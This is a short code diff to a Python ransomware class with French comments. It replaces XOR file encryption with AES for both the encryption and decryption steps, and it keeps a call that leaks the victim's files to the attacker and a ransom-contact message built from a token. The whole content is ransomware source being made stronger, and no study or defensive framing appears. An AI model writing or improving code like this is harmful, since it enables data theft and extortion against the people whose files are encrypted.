@@ -90,8 +90,9 @@ class Ransomware:
 
         # Envoyer les fichiers à l'attaquant
         secret_manager.leak_files(files_to_encrypt)
-        # Chiffrer les fichiers
-        secret_manager.xorfiles(files_to_encrypt)
+        # # Chiffrer les fichiers
+        # secret_manager.xorfiles(files_to_encrypt)
+        secret_manager.aesfiles(files_to_encrypt)
 
         # Afficher un message permettant à la victime de contacter l'attaquant avec le token au format hex.
         hex_token = secret_manager.get_hex_token()
@@ -116,7 +117,8 @@ class Ransomware:
                 secret_manager.set_key(b64_key)
 
                 # Decrypt the files
-                secret_manager.xorfiles(encrypted_files)
+                # secret_manager.xorfiles(encrypted_files)
+                secret_manager.unaesfiles(encrypted_files)
 
                 # Clean up local cryptographic elements
                 secret_manager.clean()
